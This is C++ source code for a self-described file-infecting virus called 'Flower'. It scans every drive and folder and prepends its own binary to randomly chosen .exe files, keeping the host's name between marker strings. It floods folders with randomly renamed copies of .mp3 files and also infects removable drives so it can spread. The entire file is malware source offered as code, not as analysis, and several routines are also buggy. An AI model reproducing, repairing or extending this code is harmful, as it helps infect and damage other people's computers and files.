//---------------------------------------------------------------------------

#include <vcl.h>
#pragma hdrstop

#include "Flower.h"
#include <iostream.h>
#include <fstream.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <dir.h>
#include <dos.h>
#include <windows.h>

int drivers[25];                                    //vinchesters
int remdrv[15];                                     //removed disks
char vfile[255];                                    //name of virus file
int seachdone[25];                                  // flag true-then the disk has seached
int seach_drv(int drv[25]);
int seach_remdrv(int remdrv[15],int drv[25]);       //find removed disk
int do_virus (char file[255], char vfile[255] );
char* extract_file(char vfile[255]);                //rerutn file directory
int seach_dir(char *path,int mode=0);
//---------------------------------------------------------------------------
#pragma package(smart_init)
#pragma resource "*.dfm"
TForm1 *Form1;
//---------------------------------------------------------------------------
__fastcall TForm1::TForm1(TComponent* Owner)
        : TForm(Owner)
{
}
//---------------------------------------------------------------------------



int main(int argc,char *argv[])
{
	strcpy(vfile,argv[0]);
	seach_drv(drivers);

	return 0;
}

/*-----------------------------------------------------------------------*/
/*-----------------------------------------------------------------------*/
/*-----------------------------------------------------------------------*/

int do_virus (char file[255], char vfile[255] )
{
	char tempfile[255]="";
	unsigned char data;
	const char a[][12]={"Start_Inform","End_Inform"};
	const int lena[]={12,10};
	unsigned flag = 1;

	//make tempfile
        int j;
	for(j=0; file[j]; j++) tempfile[j]=file[j];
	tempfile[j-1]='_';
	if (!rename(file,tempfile)) return 2;

	// open virus stream
	ifstream in(vfile, ios::in| ios::binary);
	if (!in) return 1;

	ofstream out (file,ios::out|ios::binary);
	if (!out)  return 2;

	// copy virus
	flag=1;
	while ((!in.eof()) && flag)
	{
		in.get(data);
		if (data!=a[0][0])
			out.put(data);
		else
		{
			char d[12];
			d[0]=a[0][0];
                        int i;
			for (i=1; i<lena[0];i++)
			{
				in.get(d[i]);
				if (a[0][i]!=d[i]) break;
			}
			if (i!=lena[0]) for(int j=0; j<=i;j++) out.put(d[j]);
			else flag=0;
		}
	  }
	in.close();

	//write information about file
	for (int i=0;i<2;i++)
	{
		for(int j=0; j<lena[i];j++) out.put(a[i][j]);
		if (i==0)
		{
			for (int j=strlen(file); file[j]!='\\'; j--);
			for(register int k=j+1; file[k]; k++) out.put(file[k]);
		}
	};


	// open found file steam
	ifstream fin(tempfile, ios::in| ios::binary);
	if (!fin) return 3;

	// copy file
	while (!fin.eof())
	{
		fin.get(data);
		out.put(data);

	}
	if (!remove(tempfile)) return 3;

	return 0;
} //do_virus

/*-----------------------------------------------------------------------*/
/*-----------------------------------------------------------------------*/
/*-----------------------------------------------------------------------*/


char *extract_file(char vfile[255])
{
	char *dir;
	char outfile[255]="";
	char data;
	

	const char a[][12]={"Start_Inform","End_Inform"};
	int lena[]={12,10};
	int flag;

	// open virus stream
	ifstream in(vfile, ios::in| ios::binary);
	if (!in) return "Not open vfile";

	// extruct file
	flag=1;
	while (!in.eof() && flag)
	{
		//seach "Srart_Inform"
		in.get(data);
		if (data==a[0][0])
		{
			int i;
			char d[12];
			d[0]=a[0][0];
			for (i=1; i<lena[0];i++)
			{
				in.get(d[i]);
				if (a[0][i]!=d[i]) break;
			}
			//"Start_Inform" is found?
			if (i==lena[0])
			{
				int p;         //outfile name leght
				p=0;
				while (!in.eof() && flag)
				{
					//seach "End_Inform"
					in.get(data);
					if (data==a[1][0])
					{
						char c[10];
						c[0]=a[1][0];
						for (i=1; i<lena[1];i++)
						{
							in.get(c[i]);
							if (a[1][i]!=c[i]) break;
						}
						//"End_Inform" is found?
						if (i==lena[1])
						{
							//open file dir
							dir=outfile;
							ofstream out(dir ,ios::out|ios::binary);
							if (!out)  return "Not open outfile";
							//copyfile
							while (!in.eof())
							{
								in.get(data);
								out.put(data);
							}
							out.close();
							flag=0;         //exit vfile
						}
						else
						{
							//get outfile name
							for(int j=0; j<=i; j++)
							{
								outfile[p]=c[j];
								p++;
							}
						}

				
					}
					else
					{
						//get outfile name
						outfile[p]=data;
						p++;
					
					}
				}
			}
		}
	  }
	in.close();
	
	return dir;


}//extruct_file


/*-----------------------------------------------------------------------*/
/*-----------------------------------------------------------------------*/
/*-----------------------------------------------------------------------*/


int seach_dir(char *path,int mode)
{
	int done;
	const int dir_deep=32; //deep of seaching directoryes
	struct ffblk file;
	int count=0;
	char dir[dir_deep][MAXPATH];
	int dircount=0,remdiskvir=0;
	char findfile[255]="";

	done=chdir(path);
	if (chdir(path)) return 0;

	//seach files
	done=findfirst("*.*", &file,7);
	while(!done)
	{
		if (!mode)
                {
				char ext[5]="";
				char name[13]="";
				int i,j,k,fl;

				//find extension in file name
				for(i=0,j=0,k=0,fl=0; file.ff_name[i]; i++)
				{
					if (fl)
					{
						ext[j]=file.ff_name[i];
						j++;
					}
					else
					{
						name[k]=file.ff_name[i];
						k++;
					}

					if (file.ff_name[i]=='.')
						fl=1;
	
				}

				//make full file name
				char tempfile[255]="";
				unsigned char data;
				strcpy(findfile,(char *)getdisk()+'A');
				strcat(findfile,":");
				strcat(findfile,path);
				if (strlen(findfile)!=1) strcat(findfile,"\\");
				strcat(findfile,name);

				randomize();
				if (!strcmp(ext,"exe") && !random(9) )
				{
       					strcpy(tempfile,findfile);
					strcat(tempfile,ext);
					do_virus(tempfile,vfile);
				}

				if (!strcmp(ext,"mp3") && !random(2))
				{
					do
					{	
						strcpy(tempfile,findfile);
						tempfile[strlen(findfile)-strlen(name)+random(strlen(name)-1)]=random(26)+'a';
						strcat(tempfile,ext);
						ifstream in(findfile, ios::in| ios::binary);
						ofstream out (tempfile,ios::out|ios::binary);
						if (in && out) 
						{
							while(in.eof())
							{
								in.get(data);
								out.put(data);
							}		
						}
					}while(random(5));
				}
                }
                else
                {
				strcpy(findfile,(char*)getdisk()+'A');
				strcat(findfile,":");
				strcat(findfile,path);
				if (strlen(findfile)!=1) strcat(findfile,"\\");
				strcat(findfile,file.ff_name);
				if(!do_virus(findfile,vfile)) remdiskvir++;
				if(remdiskvir==5) return 0;
				break;
		}
		done=findnext(&file);
	}

	//seach directory
	done=findfirst("*",&file,16);
	while(!done && count<dir_deep)
	{
		if (file.ff_name[0]=='.')
		{
			done=findnext(&file);
			continue;
                }
		strcpy(dir[count],path);
		if (strlen(dir[count])!=1) strcat(dir[count],"\\");
		strcat(dir[count],file.ff_name);
		done=findnext(&file);
		count++;
	}
	//seach removed disk
	seach_remdrv(remdrv,drivers);
	
        dircount+=count;
	//seach in found directoryes
	for(int i=0; i<count; i++) dircount+=seach_dir(dir[i]);

	return dircount;
}//seach_dir

/*-----------------------------------------------------------------------*/
/*-----------------------------------------------------------------------*/
/*-----------------------------------------------------------------------*/

int seach_drv(int drv[25])
{
   int seachdisk[25];
   int save;
   int disk;
   int rnd;
   int wk;
   int j;
   int disks=0;

   for(j=0;j<25;j++)
   {
	drv[j]=-1;
	seachdisk[j]=0;
   }	

   /* save original drive and get numbers of logical disk */
   save = getdisk();

   /* the drive letters available */
   for (disk = 0;disk < 25;++disk)
   {
      setdisk(disk);
      if (disk == getdisk())
	 {
                        if (GetDriveType(strcat(((char *)disk+'a'),":\\")) != DRIVE_NO_ROOT_DIR)
			{
                                drv[disks]=disk;
			        disks++;
                        }
	 }
   }

   //reach in dis
   for(int k=0;k<disks;k++)
   {
	setdisk(drv[k]);
	seach_dir("\\");
   }

   setdisk(save);

   return 0;
} //seach_drv

/*-----------------------------------------------------------------------*/
/*-----------------------------------------------------------------------*/
/*-----------------------------------------------------------------------*/

int seach_remdrv(int remdrv[15], int drv[25])
{
	int disk,save,wk;
	int dcount=0;

	for(int i=0;i<15;i++) remdrv[i]=-1;

	/* save original drive and get numbers of logical disk */
	save = getdisk();

	/* seach the removed drives */
	for (disk = 0;disk < 25;++disk)
	{
	setdisk(disk);
	if (disk == getdisk())
		{
                        int i;
			for(i=0;i<25;i++)
				if (disk==drv[i] && disk!=-1)
					break;
			if(i==25)
			{
				remdrv[dcount]=disk;
				dcount++;
			}

		}
	}
	// do virus in removed disk
	wk=0;
	while(remdrv[wk]!=-1)
	{
		setdisk(remdrv[wk]);
		seach_dir("\\",1);
	}

	setdisk(save);
	return 0;
}//seach_remdrv
